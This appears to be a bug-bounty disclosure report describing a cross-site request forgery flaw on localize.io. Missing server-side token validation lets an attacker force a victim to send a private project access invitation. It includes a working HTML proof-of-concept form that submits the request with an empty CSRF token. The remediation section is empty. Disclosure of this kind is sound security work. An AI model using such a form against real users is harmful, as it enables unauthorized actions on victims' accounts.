# HackerOne Report: Private Project Access Request Invitation Sent Via CSRF 
**Report ID:** 8226
**Vulnerability Class:** Cross-Site Request Forgery (CSRF)

## Vulnerability Information & PoC
Hi Team,

I have found a CSRF vulnerability using which the attacker can do or force the victim to sent Private Project Access Invitation Request Via CSRF the anti-csrf token is not getting validated on the server-side. 


Private Project Access Request Invitation Sent Via CSRF Code:

<html>
  <body>
    <form action="http://www.localize.io/" method="POST">
      <input type="hidden" name="CSRFToken" value="" />
      <input type="hidden" name="requestInvitation[repositoryID]" value="9p" />
      <input type="submit" value="Submit form" />
    </form>
  </body>
</html>


## Discussion & Remediation Timeline
